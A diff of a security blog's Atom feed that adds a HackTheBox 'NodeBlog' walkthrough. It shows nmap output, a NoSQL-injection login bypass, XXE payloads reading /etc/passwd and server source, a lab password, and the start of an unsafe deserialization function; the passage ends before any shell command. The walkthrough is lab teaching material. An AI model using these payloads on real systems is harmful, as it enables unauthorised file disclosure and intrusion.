@@ -5,7 +5,7 @@
   <subtitle>Offensive Security Researcher · Malware Developer &amp; Analyst · Exploit Developer · CTF Player</subtitle>
   <link href="http://localhost:4000/atom.xml" rel="self"/>
   <link href="http://localhost:4000/"/>
-  <updated>2026-06-24T06:10:21+02:00</updated>
+  <updated>2026-06-29T15:43:24+02:00</updated>
   <id>http://localhost:4000/</id>
   <author>
     <name>tralsesec</name>
@@ -29,7 +29,7 @@
     <title>CTF Writeups</title>
     
     <link href="http://localhost:4000/ctfs/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/ctfs/</id>
 
     
@@ -44,6 +44,86 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 
 &lt;div class=&quot;ctf-grid&quot;&gt;
 
+
+&lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
+  
+  &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
+    &lt;a href=&quot;/ctfs/htb-nodeblog/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/nodeblog.png&quot; alt=&quot;HackTheBox: NodeBlog&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
+    &lt;div style=&quot;position: absolute; top: 1rem; right: 1.5rem; font-family: var(--font-mono); font-size: 0.65rem;&quot;&gt;
+      &lt;span style=&quot;
+        background: rgba(0,0,0,0.8);
+        border: 1px solid 
+        #00ff00
+        ;
+        
+        color: 
+        #00ff00
+        ;
+        
+        
+      &quot;&gt;
+        [EASY]
+      &lt;/span&gt;
+    &lt;/div&gt;
+
+    &lt;h2 style=&quot;margin: 0 0 1rem 0;&quot;&gt;&lt;a href=&quot;/ctfs/htb-nodeblog/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;HackTheBox: NodeBlog&lt;/a&gt;&lt;/h2&gt;
+
+    &lt;div style=&quot;display: flex; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+      &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;PLATFORM:&lt;/span&gt; HackTheBox&lt;/span&gt;
+      &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TYPE:&lt;/span&gt; Machine&lt;/span&gt;
+    &lt;/div&gt;
+
+    &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+      🎯 NodeBlog
+
+    &lt;/div&gt;
+
+    &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Linux
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NoSQL-Injection
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #XXE
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Deserialization
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NodeJS
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #MongoDB
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Sudo
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Cleartext-Credentials
+      &lt;/span&gt;
+      
+    &lt;/div&gt;
+
+    &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem;&quot;&gt;
+      &lt;a href=&quot;/ctfs/htb-nodeblog/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none;&quot;&gt;
+        READ_FULL_REPORT -&amp;gt;
+      &lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
@@ -2129,7 +2209,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     <title>AdonisJS BodyParser</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/9/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/9/</id>
 
     
@@ -2275,7 +2355,7 @@ module.exports = function() {
     <title>EternalBlue</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/8/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/8/</id>
 
     
@@ -2454,7 +2534,7 @@ module.exports = function() {
     <title>MongoBleed</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/7/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/7/</id>
 
     
@@ -2564,7 +2644,7 @@ module.exports = function() {
     <title>AsyncOS Quarantine Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/6/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/6/</id>
 
     
@@ -2675,7 +2755,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>FortiWeb Edge Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/5/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/5/</id>
 
     
@@ -2802,7 +2882,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>iOS26 &quot;Liquid Glass&quot; Exploitation Chain</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/4/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/4/</id>
 
     
@@ -2938,7 +3018,7 @@ The final flaw allows the attacker to escape the sandbox via an &lt;strong&gt;In
     <title>Firefox IPC Sandbox Escape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/3/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/3/</id>
 
     
@@ -3074,7 +3154,7 @@ Validating that an input is an “Integer” is insufficient when that integer c
     <title>Lazarus 0day (AppLocker LPE)</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/2/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/2/</id>
 
     
@@ -3174,7 +3254,7 @@ The driver accepted the IOCTL and processed the pointer regardless of the caller
     <title>The MAESTRO Breakout: ESXi Ring -1 Compromise</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/12/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/12/</id>
 
     
@@ -3440,7 +3520,7 @@ Finally, the ease with which the attackers bridged the gap from User Mode to Ker
     <title>PS5 Hypervisor Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/11/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/11/</id>
 
     
@@ -3632,7 +3712,7 @@ Software sandboxing is no longer sufficient for legacy compatibility layers.&lt;
     <title>N8scape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/10/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/10/</id>
 
     
@@ -3788,7 +3868,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>React2Shell RCE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/1/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/1/</id>
 
     
@@ -3897,7 +3977,7 @@ Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their st
     <title>Anatomy of a Bug</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/</id>
 
     
@@ -4071,7 +4151,7 @@ High-fidelity technical analyses of critical vulnerabilities, kernel exploits, a
     <title>Anatomy of a Bug - LICENSE</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/LICENSE/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/LICENSE/</id>
 
     
@@ -4154,7 +4234,7 @@ f. &lt;strong&gt;Share&lt;/strong&gt; means to provide material to the public by
     <title>Projects</title>
     
     <link href="http://localhost:4000/projects/"/>
-    <updated>2026-06-24T06:10:21+02:00</updated>
+    <updated>2026-06-29T15:43:24+02:00</updated>
     <id>http://localhost:4000/projects/</id>
 
     
@@ -4549,6 +4629,334 @@ hr {
 }
 &lt;/style&gt;
 
+</content>
+  </entry>
+  
+  <entry>
+    <title>HackTheBox: NodeBlog</title>
+    
+    <link href="http://localhost:4000/ctfs/htb-nodeblog/"/>
+    <updated>2026-06-29T00:00:00+02:00</updated>
+    <id>http://localhost:4000/ctfs/htb-nodeblog/</id>
+
+    
+    
+      <category term="Mission Log" label="CTF" />
+    
+    
+    <content type="html">&lt;h1 id=&quot;-nodeblog&quot;&gt;🎯 NodeBlog&lt;/h1&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;OS:&lt;/strong&gt; Linux&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.96.160&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-htb.png&quot; alt=&quot;nodeblog.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;️-tldr--attack-chain&quot;&gt;⛓️ TL;DR / Attack Chain&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Foothold:&lt;/strong&gt; A NoSQL injection bypass on the login page grants access to the admin session. Within the admin panel, an XML upload feature is vulnerable to XXE, allowing arbitrary file reading to grab the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.js&lt;/code&gt; source code. The source code reveals an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node-serialize&lt;/code&gt; implementation processing the auth cookie, which is exploited to achieve Remote Code Execution (RCE) and a reverse shell.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;PrivEsc:&lt;/strong&gt; Local enumeration reveals MongoDB running locally without authentication. Querying the database exposes the admin cleartext password (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;). This credential enables full &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; privileges for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, allowing easy access to the root flag.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-loot--creds&quot;&gt;🔑 Loot &amp;amp; Creds&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;User&lt;/th&gt;
+      &lt;th&gt;Credential&lt;/th&gt;
+      &lt;th&gt;Where / How&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Found in the local MongoDB &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog&lt;/code&gt; database within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt; collection.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-0-setup--global-variables&quot;&gt;🔧 0. Setup &amp;amp; Global Variables&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;Run this in your terminal once so you can copy-paste the rest of the commands blindly.&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.129.96.160&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nodeblog.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-1-enumeration&quot;&gt;🔍 1. Enumeration&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; nmap &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; ./nmap/nmap
+Starting Nmap 7.99 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2026-06-29 12:32 +0200
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nodeblog.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.96.160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+5000/tcp open  http    Node.js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Express middleware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Blog
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;34.25 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;http5000&quot;&gt;HTTP/5000&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-1.png&quot; alt=&quot;nodeblog-1.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Login page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nodeblog.htb:5000/login&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-2.png&quot; alt=&quot;nodeblog-2.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trying to authenticate as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asdf&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asdf&lt;/code&gt; gives us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Username&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-3.png&quot; alt=&quot;nodeblog-3.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trying to authenticate as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; gives us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Password&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-4.png&quot; alt=&quot;nodeblog-4.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Easy to bruteforce then. I believe.&lt;/p&gt;
+
+&lt;p&gt;SQL injections seem to have no affect on the webapp. We can try NoSQL injection tho. Send request and capture with burpsuite:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-5.png&quot; alt=&quot;nodeblog-5.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked. Looking at the raw response we see this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So let’s set our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt; cookie to that value in the browser:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-6.png&quot; alt=&quot;nodeblog-6.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;New buttons appear so it must have worked. We are admin now!&lt;/p&gt;
+
+&lt;p&gt;There’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt; button. When uploading a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;png&lt;/code&gt; it says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid XML Example: Example DescriptionExample Markdown&lt;/code&gt;. So let’s upload a page XML file including an XXE payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE data [
+&amp;lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;&lt;/span&gt;
+]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;markdown&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/markdown&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-7.png&quot; alt=&quot;nodeblog-7.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked. Easy.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-2-initial-foothold&quot;&gt;🚪 2. Initial Foothold&lt;/h2&gt;
+
+&lt;p&gt;Let’s look for some source code now:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE data [
+&amp;lt;!ENTITY file SYSTEM &quot;file:///opt/blog/server.js&quot;&amp;gt;&lt;/span&gt;
+]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;kekw&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;markdown&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/markdown&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-8.png&quot; alt=&quot;nodeblog-8.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We find this function:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
+
+    &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
